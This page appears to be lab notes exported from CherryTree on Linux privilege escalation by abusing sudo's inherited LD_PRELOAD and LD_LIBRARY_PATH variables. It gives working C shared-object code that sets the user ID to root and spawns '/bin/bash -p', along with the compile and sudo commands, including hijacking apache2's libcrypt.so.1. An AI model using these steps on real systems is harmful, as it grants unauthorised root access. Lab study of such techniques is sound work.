<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>SUDO - Environment variables</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>SUDO - Environment variables</h1><br/><br /><br />Sudo can be configured to inherit certain environment variables from the user&#39;s environment.<br />Check which environment variables are inherited (look for the env_keep options):<br /><code>sudo -l</code><br />LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user&#39;s environment. <small>LD_PRELOAD  loads a shared object before any others when a program is run.  LD_LIBRARY_PATH provides a list of directories where shared libraries  are searched for first.</small><br /><br /><small>Create a shared object using the code located at /home/user/</small>tools/sudo/preload.c:<br /><br />#include &lt;stdio.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />void _init() {<br />        unsetenv(&quot;LD_PRELOAD&quot;);<br />        setresuid(0,0,0);<br />        system(&quot;/bin/bash -p&quot;);<br />}<br /><br /><br /><br /><code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</code><br />Run one of the programs you are allowed to run via sudo (listed when running <strong>sudo -l</strong>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:<br /><code>sudo LD_PRELOAD=/tmp/preload.so program-name-here</code><br /><br />A  root shell should spawn. Exit out of the shell before continuing.  Depending on the program you chose, you may need to exit out of this as  well.<br />---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br /><br /><br /><br />Run ldd against the apache2 program file to see which shared libraries are used by the program:<br /><code>ldd /usr/sbin/apache2</code><br />Create  a shared object with the same name as one of the listed libraries  (libcrypt.so.1) using the code located at  /home/user/tools/sudo/library_path.c<small>:</small><br /><br />#include &lt;stdio.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />void _init() {<br />        unsetenv(&quot;LD_PRELOAD&quot;);<br />        setresuid(0,0,0);<br />        system(&quot;/bin/bash -p&quot;);<br />}<br />user@debian:~/tools/sudo$ cat library_path.c <br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br /><br />static void hijack() __attribute__((constructor));<br /><br />void hijack() {<br />        unsetenv(&quot;LD_LIBRARY_PATH&quot;);<br />        setresuid(0,0,0);<br />        system(&quot;/bin/bash -p&quot;);<br />}<br /><br /><br /><br /><code>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</code><br />Run  apache2 using sudo, while settings the LD_LIBRARY_PATH environment  variable to /tmp (where we output the compiled shared object):<br /><code>sudo LD_LIBRARY_PATH=/tmp apache2</code><br />A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt<small>.so.1  to the name of another library used by apache2 and re-run apache2 using  sudo again. Did it work? If not, try to figure out why not, and how  the library_path.c code could be changed to make it work.</small><br /></div></body></html>